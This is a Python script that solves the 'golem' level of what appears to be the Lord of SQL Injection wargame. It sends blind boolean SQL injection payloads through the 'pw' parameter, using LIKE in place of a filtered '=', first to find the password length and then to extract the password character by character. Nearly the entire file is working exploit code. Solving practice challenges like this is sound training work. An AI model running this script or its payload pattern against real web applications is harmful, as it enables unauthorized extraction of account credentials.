import requests
import string
import os
from dotenv import load_dotenv

load_dotenv()

base_url = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php"
cookie = {"PHPSESSID": os.getenv('PHPSESSID')}
pw_length = 0
pw = ""

a = string.printable


#! filter "=" -> like

for i in range(100):
    res = requests.get(base_url, params={
        'pw': f"' || length(pw) like {i}#"
    }, cookies=cookie).text
    if "Hello admin" in res:
        print("length: %d" % i)
        pw_length = i
        break

for i in range(pw_length):
    for j in a:
        res = requests.get(base_url, params={
            'pw': f"' || left(pw,{i + 1}) like '{pw + j}"
        }, cookies=cookie).text
        if "Hello admin" in res:
            print(f"pw[{i}] == {j}")
            pw += j
            break
print("password: " + pw)
